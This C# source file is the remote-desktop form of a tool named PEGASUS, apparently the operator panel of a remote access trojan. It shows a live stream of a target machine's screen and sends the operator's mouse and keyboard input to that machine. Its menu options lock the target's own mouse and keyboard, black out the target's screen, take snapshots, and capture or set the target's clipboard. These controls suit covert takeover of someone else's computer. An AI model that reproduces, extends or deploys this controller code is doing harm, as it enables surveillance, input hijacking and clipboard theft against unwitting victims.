using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using PEGASUS.Forms.CustomControls;
using PEGASUS.Properties;
using PEGASUS.Tools;
using PEGASUS.Tools.Enum;
using PEGASUS.Tools.Helper;
using PEGASUS.Tools.MouseKeyHook;
using PEGASUS.Utilities;
using Sockets;

namespace PEGASUS.Forms
{

	public class Remote_Desktop : Form
	{
		private CancellationTokenSource source = new CancellationTokenSource();

		private TcpClientSession _tcs;

		private string _tital;

		private int Network_Traffic;

		private RemoteDesktopTcpServer rdts;

		private int RecvBytes;

		private Task statusbar;

		private UnsafeStreamCodec StreamCodec;

		private bool _enableMouseInput = true;

		private bool _enableKeyboardInput = true;

		private IKeyboardMouseEvents _keyboardHook;

		private IKeyboardMouseEvents _mouseHook;

		private List<Keys> _keysPressed;

		private string _clipboardText = "";

		private Point formPoint;

		private bool formMove;

		private IContainer components;

		public RapidPictureBox picDesktop;

		private Panel panelTitleBar;

		private Button btnMini;

		private Button btnMaxi;

		private Button btnClose;

		private PictureBox picTitleIcon;

		private Label lblTitle;

		private ContextMenuStrip remoteDesktopMenuStrip;

		private ToolStripMenuItem controlToolStripMenuItem;

		private ToolStripMenuItem blockInputToolStripMenuItem;

		private ToolStripMenuItem blankScreenToolStripMenuItem;

		private ToolStripMenuItem saveDIBToolStripMenuItem;

		private ToolStripMenuItem getClipboardToolStripMenuItem;

		private ToolStripMenuItem setClipboardToolStripMenuItem;

		public Remote_Desktop(string tital, TcpClientSession tcs)
		{
			InitializeComponent();
			_tcs = tcs;
			_tital = tital;
			Text = _tital;
		}

		private void Remote_Desktop_Load(object sender, EventArgs e)
		{
			try
			{
				SubscribeEvents();
				_tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("Start"));
				rdts = new RemoteDesktopTcpServer(1313);
				rdts._ClientMessage = UpdateRemoteDesktop_Image;
				rdts.Listen();
				statusbar = Task.Factory.StartNew((Func<Task>)async delegate
				{
					await UpdateStatusBar();
				}, TaskCreationOptions.LongRunning);
				_keysPressed = new List<Keys>();
				picDesktop.Start();
			}
			catch
			{
			}
		}

		private void SubscribeEvents()
		{
			if (Tools.Helper.PlatformHelper.RunningOnMono)
			{
				base.KeyDown += OnKeyDown;
				base.KeyUp += OnKeyUp;
				return;
			}
			_keyboardHook = Hook.GlobalEvents();
			_keyboardHook.KeyDown += OnKeyDown;
			_keyboardHook.KeyUp += OnKeyUp;
			_mouseHook = Hook.AppEvents();
			_mouseHook.MouseWheel += OnMouseWheelMove;
		}

		private void UnsubscribeEvents()
		{
			if (Tools.Helper.PlatformHelper.RunningOnMono)
			{
				base.KeyDown -= OnKeyDown;
				base.KeyUp -= OnKeyUp;
				return;
			}
			if (_keyboardHook != null)
			{
				_keyboardHook.KeyDown -= OnKeyDown;
				_keyboardHook.KeyUp -= OnKeyUp;
				_keyboardHook.Dispose();
			}
			if (_mouseHook != null)
			{
				_mouseHook.MouseWheel -= OnMouseWheelMove;
				_mouseHook.Dispose();
			}
		}

		private int GetRemoteWidth(int localX)
		{
			return localX * picDesktop.ScreenWidth / picDesktop.Width;
		}

		private int GetRemoteHeight(int localY)
		{
			return localY * picDesktop.ScreenHeight / picDesktop.Height;
		}

		private void btnMini_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		private void btnMaxi_Click(object sender, EventArgs e)
		{
			if (base.WindowState == FormWindowState.Normal)
			{
				Remote_Desktop_Maximize();
			}
			else if (base.WindowState == FormWindowState.Maximized)
			{
				Remote_Desktop_Restore();
			}
		}

		private void btnClose_Click(object sender, EventArgs e)
		{
			Close();
		}

		private void panelTitleBar_MouseDown(object sender, MouseEventArgs e)
		{
			formPoint = default(Point);
			if (e.Button == MouseButtons.Left)
			{
				formPoint = new Point(-e.X - SystemInformation.FrameBorderSize.Width, -e.Y - SystemInformation.CaptionHeight - SystemInformation.FrameBorderSize.Height);
				formMove = true;
			}
		}

		private void panelTitleBar_MouseMove(object sender, MouseEventArgs e)
		{
			if (formMove)
			{
				Point mousePosition = Control.MousePosition;
				mousePosition.Offset(formPoint.X, formPoint.Y + panelTitleBar.Height);
				base.Location = mousePosition;
			}
		}

		private void panelTitleBar_MouseUp(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				formMove = false;
			}
		}

		private void picDesktop_MouseDown(object sender, MouseEventArgs e)
		{
			if (picDesktop.Image != null && _enableMouseInput && controlToolStripMenuItem.Checked && base.ContainsFocus)
			{
				int localX = e.X;
				int localY = e.Y;
				int remoteWidth = GetRemoteWidth(localX);
				int remoteHeight = GetRemoteHeight(localY);
				MouseAction mouseAction = MouseAction.None;
				if (e.Button == MouseButtons.Left)
				{
					mouseAction = MouseAction.LeftDown;
				}
				if (e.Button == MouseButtons.Right)
				{
					mouseAction = MouseAction.RightDown;
				}
				int num = 0;
				_tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("action_mouse:" + mouseAction.ToString() + ",press:" + true + ",remote_x:" + remoteWidth + ",remote_y:" + remoteHeight + ",moniter:" + num));
			}
		}

		private void picDesktop_MouseUp(object sender, MouseEventArgs e)
		{
			if (picDesktop.Image != null && _enableMouseInput && controlToolStripMenuItem.Checked && base.ContainsFocus)
			{
				int localX = e.X;
				int localY = e.Y;
				int remoteWidth = GetRemoteWidth(localX);
				int remoteHeight = GetRemoteHeight(localY);
				MouseAction mouseAction = MouseAction.None;
				if (e.Button == MouseButtons.Left)
				{
					mouseAction = MouseAction.LeftDown;
				}
				if (e.Button == MouseButtons.Right)
				{
					mouseAction = MouseAction.RightDown;
				}
				int num = 0;
				_tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("action_mouse:" + mouseAction.ToString() + ",press:" + false + ",remote_x:" + remoteWidth + ",remote_y:" + remoteHeight + ",moniter:" + num));
			}
		}

		private void picDesktop_MouseMove(object sender, MouseEventArgs e)
		{
			if (picDesktop.Image != null && _enableMouseInput && controlToolStripMenuItem.Checked && base.ContainsFocus)
			{
				int localX = e.X;
				int localY = e.Y;
				int remoteWidth = GetRemoteWidth(localX);
				int remoteHeight = GetRemoteHeight(localY);
				int num = 0;
				_tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("action_mouse:" + MouseAction.MoveCursor.ToString() + ",press:" + false + ",remote_x:" + remoteWidth + ",remote_y:" + remoteHeight + ",moniter:" + num));
			}
		}

		private void OnMouseWheelMove(object sender, MouseEventArgs e)
		{
			if (picDesktop.Image != null && _enableMouseInput && controlToolStripMenuItem.Checked && base.ContainsFocus)
			{
				int localX = e.X;
				int localY = e.Y;
				int remoteWidth = GetRemoteWidth(localX);
				int remoteHeight = GetRemoteHeight(localY);
				_tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("action_mouse:" + ((e.Delta == 120) ? MouseAction.ScrollUp : MouseAction.ScrollDown).ToString() + ",press:" + false + ",remote_x:" + remoteWidth + ",remote_y:" + remoteHeight + ",moniter:" + 0));
			}
		}

		private void OnKeyDown(object sender, KeyEventArgs e)
		{
			if (picDesktop.Image != null && _enableKeyboardInput && controlToolStripMenuItem.Checked && base.ContainsFocus)
			{
				if (!IsLockKey(e.KeyCode))
				{
					e.Handled = true;
				}
				if (!_keysPressed.Contains(e.KeyCode))
				{
					_keysPressed.Add(e.KeyCode);
					_tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("keyboard_mouse:" + (byte)e.KeyCode + ",press:" + true));
				}
			}
		}

		private void OnKeyUp(object sender, KeyEventArgs e)
		{
			if (picDesktop.Image != null && _enableKeyboardInput && controlToolStripMenuItem.Checked && base.ContainsFocus)
			{
				if (!IsLockKey(e.KeyCode))
				{
					e.Handled = true;
				}
				_keysPressed.Remove(e.KeyCode);
				_tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("keyboard_mouse:" + (byte)e.KeyCode + ",press:" + false));
			}
		}

		private bool IsLockKey(Keys key)
		{
			if ((key & Keys.Capital) != Keys.Capital && (key & Keys.NumLock) != Keys.NumLock)
			{
				return (key & Keys.Scroll) == Keys.Scroll;
			}
			return true;
		}

		public static string FormatScreenResolution(Rectangle resolution)
		{
			return $"{resolution.Width}x{resolution.Height}";
		}

		public static Rectangle GetBounds(int screenNumber)
		{
			return Screen.AllScreens[screenNumber].Bounds;
		}

		public async Task UpdateStatusBar()
		{
			Remote_Desktop remoteDesktop = this;
			while (!remoteDesktop.source.IsCancellationRequested)
			{
				await Task.Delay(1000);
				remoteDesktop.Network_Traffic += remoteDesktop.RecvBytes;
				remoteDesktop.Text = remoteDesktop._tital + "   Download Speed: " + remoteDesktop.RecvBytes / 1024 + " KB    Downloaded Traffic: " + remoteDesktop.GetFileSize(remoteDesktop.Network_Traffic);
				remoteDesktop.RecvBytes = 0;
			}
		}

		public void SendClipboard(string strClipboard)
		{
			_tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("ClipboardText:" + strClipboard));
		}

		private void Remote_Desktop_Maximize()
		{
			base.WindowState = FormWindowState.Maximized;
			panelTitleBar.Location = new Point(0, 0);
			panelTitleBar.Size = new Size(1920, 26);
			picDesktop.Location = new Point(0, 26);
			picDesktop.Size = new Size(1920, 1054);
			btnMini.Location = new Point(1840, 2);
			btnMaxi.Location = new Point(1864, 2);
			btnClose.Location = new Point(1888, 2);
		}

		private void Remote_Desktop_Restore()
		{
			base.WindowState = FormWindowState.Normal;
			panelTitleBar.Location = new Point(0, 0);
			panelTitleBar.Size = new Size(1000, 26);
			picDesktop.Location = new Point(0, 26);
			picDesktop.Size = new Size(1000, 564);
			btnMini.Location = new Point(926, 2);
			btnMaxi.Location = new Point(950, 2);
			btnClose.Location = new Point(974, 2);
		}

		private void Remote_Desktop_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				if (statusbar != null)
				{
					if (!statusbar.IsCompleted)
					{
						source.Cancel();
					}
					statusbar.Dispose();
				}
				source.Dispose();
				rdts?.Close();
				_tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("Stop"));
				UnsubscribeEvents();
			}
			catch
			{
			}
			finally
			{
				statusbar = null;
				source = null;
				rdts = null;
				_tcs = null;
			}
		}

		private void UpdateRemoteDesktop_Image(byte[] message)
		{
			try
			{
				if (StreamCodec == null)
				{
					StreamCodec = new UnsafeStreamCodec(100, 0, "1920x1080");
				}
				if (Encoding.UTF8.GetString(message).Contains("BlockInput:Fail"))
				{
					Invoke((MethodInvoker)delegate
					{
						MessageBox.Show("Block input function failed, you need to use administrator privileges");
					});
				}
				else if (Encoding.UTF8.GetString(message).Contains("Clipboard:"))
				{
					Invoke((MethodInvoker)delegate
					{
						string @string = Encoding.UTF8.GetString(message);
						if (_clipboardText != @string)
						{
							_clipboardText = @string;
						}
					});
				}
				else
				{
					using MemoryStream inStream = new MemoryStream(message);
					UpdataPictureBox(StreamCodec.DecodeData(inStream));
				}
				RecvBytes += message.Length + 4;
			}
			catch
			{
			}
		}

		private void UpdataPictureBox(Image returnImage)
		{
			if (picDesktop.InvokeRequired)
			{
				picDesktop.Invoke((MethodInvoker)delegate
				{
					picDesktop.UpdateImage(new Bitmap(returnImage), cloneBitmap: true);
				});
			}
			else
			{
				picDesktop.Image = returnImage;
			}
		}

		private string GetFileSize(double size)
		{
			try
			{
				if (size >= 0.0 && size < 1024.0)
				{
					return size + " Bytes";
				}
				double num = size / 1024.0;
				if (num >= 1.0 && num < 1024.0)
				{
					return num.ToString("#.0") + " KB";
				}
				double num2 = size / 1048576.0;
				if (num2 >= 1.0 && num2 < 1024.0)
				{
					return num2.ToString("#.0") + " MB";
				}
				double num3 = size / 1073741824.0;
				return (num3 >= 1.0) ? (num3.ToString("#.0") + " GB") : null;
			}
			catch
			{
				return null;
			}
		}

		private void controlToolStripMenuItem_Click(object sender, EventArgs e)
		{
			controlToolStripMenuItem.Checked = !controlToolStripMenuItem.Checked;
			if (!controlToolStripMenuItem.Checked)
			{
				controlToolStripMenuItem.CheckState = CheckState.Checked;
			}
			else
			{
				controlToolStripMenuItem.CheckState = CheckState.Unchecked;
			}
		}

		private void blockInputToolStripMenuItem_Click(object sender, EventArgs e)
		{
			blockInputToolStripMenuItem.Checked = !blockInputToolStripMenuItem.Checked;
			if (!blockInputToolStripMenuItem.Checked)
			{
				blockInputToolStripMenuItem.CheckState = CheckState.Checked;
				_tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("BlockInput:Enable"));
			}
			else
			{
				blockInputToolStripMenuItem.CheckState = CheckState.Unchecked;
				_tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("BlockInput:Disable"));
			}
		}

		private void blankScreenToolStripMenuItem_Click(object sender, EventArgs e)
		{
			blankScreenToolStripMenuItem.Checked = !blankScreenToolStripMenuItem.Checked;
			if (!blankScreenToolStripMenuItem.Checked)
			{
				blankScreenToolStripMenuItem.CheckState = CheckState.Checked;
				_tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("BlankScreen:Enable"));
			}
			else
			{
				blankScreenToolStripMenuItem.CheckState = CheckState.Unchecked;
				_tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("BlankScreen:Disable"));
			}
		}

		private void saveDIBToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				using SaveFileDialog saveFileDialog = new SaveFileDialog();
				saveFileDialog.RestoreDirectory = true;
				saveFileDialog.Title = "Save Image File";
				saveFileDialog.DefaultExt = "png";
				saveFileDialog.Filter = "image files (*.png)|*.png|All files (*.*)|*.*";
				saveFileDialog.FilterIndex = 2;
				if (saveFileDialog.ShowDialog() == DialogResult.OK)
				{
					string fileName = saveFileDialog.FileName;
					picDesktop.Image.Save(fileName);
				}
			}
			catch (Exception)
			{
				MessageBox.Show("Can't save image file");
			}
		}

		private void getClipboardToolStripMenuItem_Click(object sender, EventArgs e)
		{
			getClipboardToolStripMenuItem.Checked = !getClipboardToolStripMenuItem.Checked;
			if (!getClipboardToolStripMenuItem.Checked)
			{
				getClipboardToolStripMenuItem.CheckState = CheckState.Checked;
				_tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("GetClipboard:Enable"));
			}
			else
			{
				getClipboardToolStripMenuItem.CheckState = CheckState.Unchecked;
				_tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("GetClipboard:Disable"));
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			panelTitleBar = new System.Windows.Forms.Panel();
			lblTitle = new System.Windows.Forms.Label();
			picTitleIcon = new System.Windows.Forms.PictureBox();
			btnMini = new System.Windows.Forms.Button();
			btnMaxi = new System.Windows.Forms.Button();
			btnClose = new System.Windows.Forms.Button();
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Remote_Desktop));
			picDesktop = new Forms.CustomControls.RapidPictureBox();
			((System.ComponentModel.ISupportInitialize)picDesktop).BeginInit();
			SuspendLayout();
			panelTitleBar.SuspendLayout();
			panelTitleBar.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
			panelTitleBar.Controls.Add(lblTitle);
			panelTitleBar.Controls.Add(picTitleIcon);
			panelTitleBar.Controls.Add(btnClose);
			panelTitleBar.Controls.Add(btnMini);
			panelTitleBar.Controls.Add(btnMaxi);
			panelTitleBar.Location = new System.Drawing.Point(0, 0);
			panelTitleBar.Name = "panelTitleBar";
			panelTitleBar.Size = new System.Drawing.Size(1000, 26);
			panelTitleBar.TabIndex = 0;
			panelTitleBar.MouseDown += new System.Windows.Forms.MouseEventHandler(panelTitleBar_MouseDown);
			panelTitleBar.MouseMove += new System.Windows.Forms.MouseEventHandler(panelTitleBar_MouseMove);
			panelTitleBar.MouseUp += new System.Windows.Forms.MouseEventHandler(panelTitleBar_MouseUp);
			lblTitle.AutoSize = true;
			lblTitle.ForeColor = System.Drawing.Color.FromArgb(83, 246, 229);
			lblTitle.Location = new System.Drawing.Point(38, 7);
			lblTitle.Name = "lblTitle";
			lblTitle.Size = new System.Drawing.Size(49, 14);
			lblTitle.TabIndex = 5;
			lblTitle.Text = "Remote Desktop";
			btnClose.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
			btnClose.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
			btnClose.Font = new System.Drawing.Font("Italic", 10.5f, System.Drawing.FontStyle.Bold);
			btnClose.ForeColor = System.Drawing.SystemColors.Window;
			btnClose.Location = new System.Drawing.Point(974, 2);
			btnClose.Name = "btnClose";
			btnClose.Size = new System.Drawing.Size(20, 20);
			btnClose.TabIndex = 4;
			btnClose.Text = "X";
			btnClose.UseVisualStyleBackColor = false;
			btnClose.Click += new System.EventHandler(btnClose_Click);
			btnMini.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
			btnMini.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
			btnMini.Font = new System.Drawing.Font("Italic", 10.5f, System.Drawing.FontStyle.Bold);
			btnMini.ForeColor = System.Drawing.SystemColors.Window;
			btnMini.Location = new System.Drawing.Point(926, 2);
			btnMini.Name = "button1";
			btnMini.Size = new System.Drawing.Size(20, 20);
			btnMini.TabIndex = 2;
			btnMini.Text = "一";
			btnMini.UseVisualStyleBackColor = false;
			btnMini.Click += new System.EventHandler(btnMini_Click);
			btnMaxi.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
			btnMaxi.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
			btnMaxi.Font = new System.Drawing.Font("Italic", 10.5f, System.Drawing.FontStyle.Bold);
			btnMaxi.ForeColor = System.Drawing.SystemColors.Window;
			btnMaxi.Location = new System.Drawing.Point(950, 2);
			btnMaxi.Name = "btnMaxi";
			btnMaxi.Size = new System.Drawing.Size(20, 20);
			btnMaxi.TabIndex = 3;
			btnMaxi.Text = "O";
			btnMaxi.UseVisualStyleBackColor = false;
			btnMaxi.Click += new System.EventHandler(btnMaxi_Click);
			picTitleIcon.Image = Properties.Resources.frtg9;
			picTitleIcon.Location = new System.Drawing.Point(4, 3);
			picTitleIcon.Name = "pictureBox1";
			picTitleIcon.Size = new System.Drawing.Size(25, 19);
			picTitleIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			picTitleIcon.TabIndex = 6;
			picTitleIcon.TabStop = false;
			picDesktop.BackColor = System.Drawing.Color.Black;
			picDesktop.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
			picDesktop.Cursor = System.Windows.Forms.Cursors.Default;
			picDesktop.GetImageSafe = null;
			picDesktop.Location = new System.Drawing.Point(0, 26);
			picDesktop.Name = "picDesktop";
			picDesktop.Running = false;
			picDesktop.Size = new System.Drawing.Size(1000, 564);
			picDesktop.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			picDesktop.TabIndex = 0;
			picDesktop.TabStop = false;
			picDesktop.MouseDown += new System.Windows.Forms.MouseEventHandler(picDesktop_MouseDown);
			picDesktop.MouseMove += new System.Windows.Forms.MouseEventHandler(picDesktop_MouseMove);
			picDesktop.MouseUp += new System.Windows.Forms.MouseEventHandler(picDesktop_MouseUp);
			remoteDesktopMenuStrip = new System.Windows.Forms.ContextMenuStrip();
			controlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			blockInputToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			blankScreenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			saveDIBToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			getClipboardToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			setClipboardToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			remoteDesktopMenuStrip.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
			remoteDesktopMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[6] { controlToolStripMenuItem, blockInputToolStripMenuItem, blankScreenToolStripMenuItem, saveDIBToolStripMenuItem, getClipboardToolStripMenuItem, setClipboardToolStripMenuItem });
			remoteDesktopMenuStrip.Name = "remoteDesktopMenuStrip";
			remoteDesktopMenuStrip.Size = new System.Drawing.Size(219, 400);
			controlToolStripMenuItem.BackgroundImage = (System.Drawing.Image)resources.GetObject("backcolor");
			controlToolStripMenuItem.CheckOnClick = true;
			controlToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(83, 246, 229);
			controlToolStripMenuItem.Name = "controlToolStripMenuItem";
			controlToolStripMenuItem.Size = new System.Drawing.Size(218, 22);
			controlToolStripMenuItem.Text = "Control screen";
			controlToolStripMenuItem.Click += new System.EventHandler(controlToolStripMenuItem_Click);
			blockInputToolStripMenuItem.BackgroundImage = (System.Drawing.Image)resources.GetObject("backcolor");
			blockInputToolStripMenuItem.CheckOnClick = true;
			blockInputToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(83, 246, 229);
			blockInputToolStripMenuItem.Name = "blockInputToolStripMenuItem";
			blockInputToolStripMenuItem.Size = new System.Drawing.Size(218, 22);
			blockInputToolStripMenuItem.Text = "Lock server Mouse/Keyboard";
			blockInputToolStripMenuItem.Click += new System.EventHandler(blockInputToolStripMenuItem_Click);
			blankScreenToolStripMenuItem.BackgroundImage = (System.Drawing.Image)resources.GetObject("backcolor");
			blankScreenToolStripMenuItem.CheckOnClick = true;
			blankScreenToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(83, 246, 229);
			blankScreenToolStripMenuItem.Name = "blankScreenToolStripMenuItem";
			blankScreenToolStripMenuItem.Size = new System.Drawing.Size(218, 22);
			blankScreenToolStripMenuItem.Text = "Black Screen on Server";
			blankScreenToolStripMenuItem.Click += new System.EventHandler(blankScreenToolStripMenuItem_Click);
			saveDIBToolStripMenuItem.BackgroundImage = (System.Drawing.Image)resources.GetObject("backcolor");
			saveDIBToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(83, 246, 229);
			saveDIBToolStripMenuItem.Name = "saveDIBToolStripMenuItem";
			saveDIBToolStripMenuItem.Size = new System.Drawing.Size(218, 22);
			saveDIBToolStripMenuItem.Text = "Save Snapshot";
			saveDIBToolStripMenuItem.Click += new System.EventHandler(saveDIBToolStripMenuItem_Click);
			getClipboardToolStripMenuItem.BackgroundImage = (System.Drawing.Image)resources.GetObject("backcolor");
			getClipboardToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(83, 246, 229);
			getClipboardToolStripMenuItem.CheckOnClick = true;
			getClipboardToolStripMenuItem.Name = "getClipboardToolStripMenuItem";
			getClipboardToolStripMenuItem.Size = new System.Drawing.Size(218, 22);
			getClipboardToolStripMenuItem.Text = "Get Clipboard";
			getClipboardToolStripMenuItem.Click += new System.EventHandler(getClipboardToolStripMenuItem_Click);
			setClipboardToolStripMenuItem.BackgroundImage = (System.Drawing.Image)resources.GetObject("backcolor");
			setClipboardToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(83, 246, 229);
			setClipboardToolStripMenuItem.Name = "setClipboardToolStripMenuItem";
			setClipboardToolStripMenuItem.Size = new System.Drawing.Size(218, 22);
			setClipboardToolStripMenuItem.Text = "Set Clipboard";
			panelTitleBar.ContextMenuStrip = remoteDesktopMenuStrip;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 12f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.ClientSize = new System.Drawing.Size(1000, 590);
			base.Controls.Add(panelTitleBar);
			base.Controls.Add(picDesktop);
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "Remote_Desktop";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			Text = "Remote_Desktop";
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(Remote_Desktop_FormClosed);
			base.Load += new System.EventHandler(Remote_Desktop_Load);
			panelTitleBar.ResumeLayout(false);
			panelTitleBar.PerformLayout();
			((System.ComponentModel.ISupportInitialize)picDesktop).EndInit();
			ResumeLayout(false);
		}
	}
}